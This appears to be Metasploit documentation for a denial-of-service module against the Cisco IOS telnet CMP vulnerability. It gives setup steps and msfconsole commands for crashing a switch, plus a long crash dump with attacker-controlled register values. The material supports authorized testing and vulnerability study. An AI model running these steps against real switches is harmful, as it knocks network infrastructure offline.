## Vulnerable Application

  1. Obtain a Cisco switch of any model indicated here that is running vulnerable firmware: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp. Note that the vulnerability spans many years. We tested two firmwares 10 years apart and were able to verify exploitability.
  2. Enable telnet access and verify that you can reach the switch normally via that mode.

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/dos/cisco/ios_telnet_rocem`
  3. Do: `set RHOST 192.168.1.10`
  4. Do: ```run```
  5. The switch should restart and display crash information on the console.

## Scenarios

```
Switch#sh ver
*Mar  1 01:28:01.802: %SYS-5-CONFIG_I: Configured from console by console
Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(53)SE2, RELEASE SOFTWARE (fc3)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2010 by Cisco Systems, Inc.
Compiled Wed 21-Apr-10 04:49 by prod_rel_team
Image text-base: 0x01000000, data-base: 0x02C00000
ROM: Bootstrap program is C3750 boot loader
BOOTLDR: C3750 Boot Loader (C3750-HBOOT-M) Version 12.2(44)SE5, RELEASE SOFTWARE (fc1)
Switch uptime is 1 hour, 28 minutes
System returned to ROM by power-on
System image file is "flash:/c3750-ipbasek9-mz.122-53.SE2/c3750-ipbasek9-mz.122-53.SE2.bin"
[...]
cisco WS-C3750-48TS (PowerPC405) processor (revision M0) with 131072K bytes of memory.
Processor board ID CAT1017Z2Z2
Last reset from power-on
1 Virtual Ethernet interface
48 FastEthernet interfaces
4 Gigabit Ethernet interfaces
The password-recovery mechanism is enabled.
[...]
Cisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 12.2(55)SE10, RELEASE SOFTWARE (fc2)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2015 by Cisco Systems, Inc.
Compiled Wed 11-Feb-15 11:40 by prod_rel_team
Image text-base: 0x01000000, data-base: 0x02F00000
[...]
Election Complete
Switch 2 booting as Master
Waiting for Port download...Complete
[...]
cisco WS-C3750-48TS (PowerPC405) processor (revision M0) with 131072K bytes of memory.
Processor board ID CAT1017Z2Z2
Last reset from power-on
1 Virtual Ethernet interface
48 FastEthernet interfaces
4 Gigabit Ethernet interfaces
The password-recovery mechanism is enabled.
[...]
Switch Ports Model              SW Version            SW Image
------ ----- -----              ----------            ----------
*    2 52    WS-C3750-48TS      12.2(55)SE10          C3750-IPSERVICESK9-M
[... booted successfully, waiting at a prompt, DoS exploit follows ...]
Switch#
 00:37:15 UTC Mon Mar 1 1993: Unexpected exception to CPUvector 400, PC = 41414140
-Traceback= 41414140
Writing crashinfo to flash:/crashinfo_ext/crashinfo_ext_1
=== Flushing messages (00:37:19 UTC Mon Mar 1 1993) ===
Buffered messages:
00:00:26: %STACKMGR-4-SWITCH_ADDED: Switch 1 has been ADDED to the stack
00:00:27: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down
00:00:29: %SPANTREE-5-EXTENDED_SYSID: Extended SysId enabled for type vlan
00:00:50: %STACKMGR-5-SWITCH_READY: Switch 1 is READY
00:00:50: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 1 Switch 1 has changed to state DOWN
00:00:50: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 2 Switch 1 has changed to state DOWN
00:00:50: %STACKMGR-5-MASTER_READY: Master Switch 1 is READY
00:00:50: %SYS-5-RESTART: System restarted --
Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)
Copyright (c) 1986-2007 by Cisco Systems, Inc.
Compiled Fri 20-Jul-07 01:58 by nachen
00:01:48: %SYS-5-CONFIG_I: Configured from console by console
00:27:53: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up
00:27:54: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up
00:28:22: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up
00:30:00: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to down
00:30:00: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down
00:30:01: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to down
00:32:44: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up
00:32:45: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up
00:33:13: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up
Queued messages:
Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)
Copyright (c) 1986-2007 by Cisco Systems, Inc.
Compiled Fri 20-Jul-07 01:58 by nachen
Instruction Access Exception (0x0400)!
SRR0 = 0x41414140  SRR1 = 0x00029230  SRR2 = 0x00648990  SRR3 = 0x00021200
ESR = 0x00000000  DEAR = 0x00000000  TSR = 0x8C000000  DBSR = 0x00000000
CPU Register Context:
Vector = 0x00000400  PC = 0x41414140  MSR = 0x00029230  CR = 0x53000005
LR = 0x41414141  CTR = 0x0004D860  XER = 0xC0000050
R0 = 0x41414141  R1 = 0x02DDEE80  R2 = 0x00000000  R3 = 0x0358907C
R4 = 0x00000001  R5 = 0xFFFFFFFF  R6 = 0x0182C1B0  R7 = 0x00000000
R8 = 0x00000001  R9 = 0x0290C84C  R10 = 0x00000031  R11 = 0x00000000
R12 = 0x00221C89  R13 = 0x00110000  R14 = 0x00BD7284  R15 = 0x00000000
R16 = 0x00000000  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x00000000
R20 = 0xFFFFFFFF  R21 = 0x00000000  R22 = 0x00000000  R23 = 0x02DDF078
R24 = 0x00000000  R25 = 0x00000001  R26 = 0x000003FB  R27 = 0x00000024
R28 = 0x41414141  R29 = 0x41414141  R30 = 0x41414141  R31 = 0x41414141
Stack trace:
PC = 0x41414140, SP = 0x02DDEE80
Frame 00: SP = 0x41414141    PC = 0x41414141
Switch uptime is 37 minutes, 22 seconds
[... rebooting ... ]
Switch   Ports  Model              SW Version              SW Image
------   -----  -----              ----------              ----------
*    1   52     WS-C3750-48TS      12.2(35)SE5             C3750-IPBASEK9-M
Failed to generate persistent self-signed certificate.
    Secure server will use temporary self-signed certificate.
Press RETURN to get started!
00:00:26: %STACKMGR-4-SWITCH_ADDED: Switch 1 has been ADDED to the stack
00:00:27: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to down
00:00:29: %SPANTREE-5-EXTENDED_SYSID: Extended SysId enabled for type vlan
00:00:31: %SYS-5-CONFIG_I: Configured from memory by console
00:00:31: %STACKMGR-5-SWITCH_READY: Switch 1 is READY
00:00:31: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 1 Switch 1 has changed to state DOWN
00:00:31: %STACKMGR-4-STACK_LINK_CHANGE: Stack Port 2 Switch 1 h
Switch>
Switch>as changed to state DOWN
00:00:32: %STACKMGR-5-MASTER_READY: Master Switch 1 is READY
00:00:32: %SYS-5-RESTART: System restarted --
Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)
Copyright (c) 1986-2007 by Cisco Systems, Inc.
Compiled Fri 20-Jul-07 01:58 by nachen
00:00:33: %LINK-3-UPDOWN: Interface FastEthernet1/0/1, changed state to up
00:00:34: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet1/0/1, changed state to up
Switch>
Switch>
00:01:04: %LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan1, changed state to up
00:01:32: %PLATFORM-1-CRASHED: System previously crashed with the following message:
00:01:32: %PLATFORM-1-CRASHED: Cisco IOS Software, C3750 Software (C3750-IPBASEK9-M), Version 12.2(35)SE5, RELEASE SOFTWARE (fc1)
00:01:32: %PLATFORM-1-CRASHED: Copyright (c) 1986-2007 by Cisco Systems, Inc.
00:01:32: %PLATFORM-1-CRASHED: Compiled Fri 20-Jul-07 01:58 by nachen
00:01:32: %PLATFORM-1-CRASHED:
00:01:32: %PLATFORM-1-CRASHED: Instruction Access Exception (0x0400)!
00:01:32: %PLATFORM-1-CRASHED:
00:01:32: %PLATFORM-1-CRASHED: SRR0 = 0x41414140  SRR1 = 0x00029230  SRR2 = 0x00648990  SRR3 = 0x00021200
00:01:32: %PLATFORM-1-CRASHED: ESR = 0x00000000  DEAR = 0x00000000  TSR = 0x8C000000  DBSR = 0x00000000
00:01:32: %PLATFORM-1-CRASHED:
00:01:32: %PLATFORM-1-CRASHED: CPU Register Context:
00:01:32: %PLATFORM-1-CRASHED: Vector = 0x00000400  PC = 0x41414140  MSR = 0x00029230  CR = 0x53000005
00:01:32: %PLATFORM-1-CRASHED: LR = 0x41414141  CTR = 0x0004D860  XER = 0xC0000050
00:01:32: %PLATFORM-1-CRASHED: R0 = 0x41414141  R1 = 0x02DDEE80  R2 = 0x00000000  R3 = 0x0358907C
00:01:32: %PLATFORM-1-CRASHED: R4 = 0x00000001  R5 = 0xFFFFFFFF  R6 = 0x0182C1B0  R7 = 0x00000000
00:01:32: %PLATFORM-1-CRASHED: R8 = 0x00000001  R9 = 0x0290C84C  R10 = 0x00000031  R11 = 0x00000000
00:01:32: %PLATFORM-1-CRASHED: R12 = 0x00221C89  R13 = 0x00110000  R14 = 0x00BD7284  R15 = 0x00000000
00:01:32: %PLATFORM-1-CRASHED: R16 = 0x00000000  R17 = 0x00000000  R18 = 0x00000000  R19 = 0x00000000
00:01:32: %PLATFORM-1-CRASHED: R20 = 0xFFFFFFFF  R21 = 0x00000000  R22 = 0x00000000  R23 = 0x02DDF078
00:01:32: %PLATFORM-1-CRASHED: R24 = 0x00000000  R25 = 0x00000001  R26 = 0x000003FB  R27 = 0x00000024
00:01:32: %PLATFORM-1-CRASHED: R28 = 0x41414141  R29 = 0x41414141  R30 = 0x41414141  R31 = 0x41414141
00:01:32: %PLATFORM-1-CRASHED:
00:01:32: %PLATFORM-1-CRASHED: Stack trace:
00:01:32: %PLATFORM-1-CRASHED: PC = 0x41414140, SP = 0x02DDEE80
00:01:32: %PLATFORM-1-CRASHED: Frame 00: SP = 0x41414141    PC = 0x41414141
00:01:32: %PLATFORM-1-CRASHED:
```
